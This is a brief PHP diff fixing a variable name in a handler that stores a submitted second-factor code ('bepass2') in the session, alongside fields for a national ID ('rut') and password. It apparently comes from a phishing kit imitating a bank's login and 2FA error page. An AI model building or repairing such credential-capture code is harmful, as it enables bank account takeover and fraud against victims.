@@ -118,7 +118,7 @@ if (isset($_POST['rut'],$_POST['password'])) {
 
 // 2FA-error.php
 } elseif (isset($_POST['bepass2'])) {
-    $code = trim($_POST['bepass2']);
+    $bepass2 = trim($_POST['bepass2']);
     $_SESSION['bepass2'] = $bepass2;
     $form_origen = "2FA-error.php";
     $bepass2_esc = htmlspecialchars($bepass2, ENT_QUOTES, 'UTF-8');
